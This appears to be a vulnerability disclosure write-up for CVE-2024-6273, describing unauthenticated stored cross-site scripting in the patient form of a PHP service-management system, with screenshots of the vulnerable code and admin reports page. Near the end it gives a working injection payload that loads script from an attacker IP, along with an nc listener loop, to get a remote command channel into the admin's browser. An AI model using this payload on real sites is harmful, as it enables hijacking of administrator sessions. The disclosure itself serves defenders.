# CVE-2024-6273 - Stored Cross Site Scripting by an Unauthenticated User

**Researcher Name:** Guru Raghav Saravanan

**Product:** Service Provider Management System using PHP and MySQL

**Vulnerability:** Stored Cross Site Scripting by an Unauthenticated User

**POC:**
The vulnerability is present in **patient_side.php**. The input fields Full Name, Contact and Address does not sanitize the user input which leads to Stored Cross Site Scripting.

The **save_patient()** function in **master.php** does not sanitize the input before saving.

**patient_side.php**

![patient_side.php](assets/CVE-2024-6273/pic0.png "patient_side.php")

**master.php**

![master.php](assets/CVE-2024-6273/pic1.png "master.php")

Endpoint: https://<vulnerable_site>/patient_side

![patient_form](assets/CVE-2024-6273/pic2.png "patient_form")

Clicking on Submit, the form is submitted to the administrator and can only be viewed by the admin.

![patient_form](assets/CVE-2024-6273/pic3.png "patient_form")

![patient_form](assets/CVE-2024-6273/pic4.png "patient_form")

Now to view the submitted form, login as admin and click on the reports section.

![Report](assets/CVE-2024-6273/pic5.png "Report")

![Report](assets/CVE-2024-6273/pic6.png "Report")

![Report](assets/CVE-2024-6273/pic7.png "Report")

All the stored XSS gets executed…

**Leveraging reverse_connection:**

**Payload:**
**Attacker-Side:** `while :; do printf "sgr>$ "; read c; echo $c | nc -vvlp 4444 >/dev/null; done` 

**Victim-Side:** `"><script>setInterval(function(){d=document;z=d.createElement("script");z.src="//<attacker-ip>:4444";d.body.appendChild(z)},0)</script>`

![shell](assets/CVE-2024-6273/pic8.png "shell")

Start the listener

![payload](assets/CVE-2024-6273/pic9.png "payload")

Visit the reports page now…

![Report](assets/CVE-2024-6273/pic10.png "Report")

Reverse connection received in the attacker machine.

![Report](assets/CVE-2024-6273/pic11.png "Report")